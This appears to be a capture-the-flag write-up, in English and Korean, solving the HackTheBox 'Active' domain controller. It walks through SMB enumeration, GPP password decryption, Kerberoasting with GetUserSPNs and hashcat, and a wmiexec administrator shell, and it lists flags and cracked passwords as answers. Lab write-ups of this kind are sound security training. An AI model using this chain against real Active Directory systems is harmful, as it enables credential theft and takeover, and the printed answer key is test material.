
| Task                                                                  | Answer                           |
| --------------------------------------------------------------------- | -------------------------------- |
| [[#How many SMB shares are shared by the target?]]                    | 7                                |
| [[#What is the name of the share that allows anonymous read access?]] | Replication                      |
| [[#Which file has encrypted account credentials in it?]]              | Groups.xml                       |
| [[#What is the decrpyted password for the SVC_TGS account?]]          | GPPstillStandingStrong2k18       |
| [[#Submit the flag located on the security user's desktop.]]          | 6b41eba3bce7905fac1bee0bf2897096 |
| [[#Which service account on Active is vulnerable to Kerberoasting?]]  | c5c68ce5956a6b81b423b97feb77a638 |
## How many SMB shares are shared by the target?

```bash
Nmap scan report for app.htb (10.129.45.168)
Host is up (0.19s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-21 07:40:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-21T07:41:21
|_  start_date: 2026-01-21T07:23:56
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 430.33 seconds

```

```bash
smbclient -L 10.129.45.168 -N
```

![[Pasted image 20260121171735.png]]


## What is the name of the share that allows anonymous read access?

```bash
smbmap -H app.htb
```
![[Pasted image 20260122112615.png]]



## Which file has encrypted account credentials in it?

Download all data using smbclient
smbclient 사용하여 모든 데이터 다운로드
```bash
smbclient //app.htb/Replication
#smb
recurse on
prompt off
mget **
```
![[Pasted image 20260122133042.png]]

Password hash found in Groups.xml file downloaded
다운받은 파일에서 Groups.xml 발견한  password hash
![[Pasted image 20260122133721.png]]



## What is the decrpyted password for the SVC_TGS account?

Policies에서 찾은 groups.xml은 GPP를 통해 저장할 때 AES-256으로 암호화
groups.xml found in Policies is encrypted with AES-256 when saved via GPP

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
![[Pasted image 20260122134743.png]]


## Submit the flag located on the security user's desktop.

```bash
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H app.htb
```
![[Pasted image 20260122135049.png]]

![[Pasted image 20260122135116.png]]

```bash
smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //app.htb/Users
#client
get user.txt
```
![[Pasted image 20260122135557.png]]

![[Pasted image 20260122135627.png]]
![[Pasted image 20260122135649.png]]

## Which service account on Active is vulnerable to Kerberoasting?

```bash
#활성화된 관리자 계정 식별
ldapsearch -x -H 'ldap://app.htb' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
```

![[Pasted image 20260122142819.png]]

```bash
python3 GetADUsers.py -all active.htb/svc_tgs -dc-ip app.htb
```

![[Pasted image 20260122143501.png]]

## Kerberoasting

```bash
ldapsearch -x -H 'ldap://app.htb' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
```
![[Pasted image 20260122144109.png]]

```bash
python3 GetUserSPNs.py active.htb/svc_tgs -dc-ip app.htb  
```

![[Pasted image 20260122144517.png]]

administrator 해시값 추출
```bash
python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip app.htb -request
```

![[Pasted image 20260122144927.png]]

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

![[Pasted image 20260122145100.png]]

```bash
impacket-wmiexec 'active.htb/administrator:Ticketmaster1968@10.129.46.170'
```
![[Pasted image 20260122145448.png]]
